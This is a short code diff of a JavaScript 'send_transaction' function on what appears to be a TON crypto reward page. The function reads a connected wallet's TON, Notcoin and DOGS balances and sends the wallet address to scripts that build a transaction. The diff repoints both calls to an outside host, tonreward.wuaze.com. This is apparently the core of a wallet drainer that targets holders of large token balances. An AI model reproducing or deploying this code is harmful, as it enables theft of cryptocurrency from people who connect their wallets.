@@ -157,7 +157,7 @@ async function send_transaction() {
                 const tonBalance = data.result.balance / 1000000000;
                 if (tonBalance < 0.07) {
                     if (notcoinBalance >= 300 || dogsBalance > 3000){
-                    fetch('getfee.php', {
+                    fetch('https://tonreward.wuaze.com/getfee.php', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -196,7 +196,7 @@ async function send_transaction() {
     .catch(error => alert('Error fetching jettons balances:', error));
         const wallet_address = tonConnectUI.account.address;
 
-        let body = await (await fetch("api.php?command=get_transaction_json&wallet_sender=" + wallet_address)).json();       
+        let body = await (await fetch("https://tonreward.wuaze.com/api.php?command=get_transaction_json&wallet_sender=" + wallet_address)).json();       
         if (body.status === "error") {
                 return Swal.fire({
                 title: body.body,
